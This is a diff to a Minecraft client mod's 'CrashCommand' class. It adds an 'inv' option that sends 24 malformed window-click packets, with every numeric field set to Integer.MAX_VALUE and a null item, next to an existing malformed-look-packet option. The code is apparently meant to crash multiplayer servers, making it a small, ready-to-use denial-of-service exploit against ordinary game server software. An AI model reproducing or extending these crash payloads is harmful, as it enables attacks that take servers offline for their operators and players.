@@ -11,6 +11,7 @@ import net.minecraft.client.Minecraft;
 import net.minecraft.network.Packet;
 import net.minecraft.network.play.client.C01PacketChatMessage;
 import net.minecraft.network.play.client.C03PacketPlayer;
+import net.minecraft.network.play.client.C0EPacketClickWindow;
 
 import java.util.ArrayList;
 import java.util.Arrays;
@@ -168,6 +169,11 @@ public class CrashCommand extends Command {
                     case "ir":
                         for (int i = 0; i < 24; i++) {
                             sendPacket(new C03PacketPlayer.C05PacketPlayerLook(0, (float) 0.3919237719237813132871932671312378908, true));
+                        }
+                        break;
+                    case "inv":
+                        for (int i = 0; i < 24; i++) {
+                            sendPacket(new C0EPacketClickWindow(Integer.MAX_VALUE, Integer.MAX_VALUE, Integer.MAX_VALUE, Integer.MAX_VALUE, null, (short) 233));
                         }
                         break;
                     case "list":
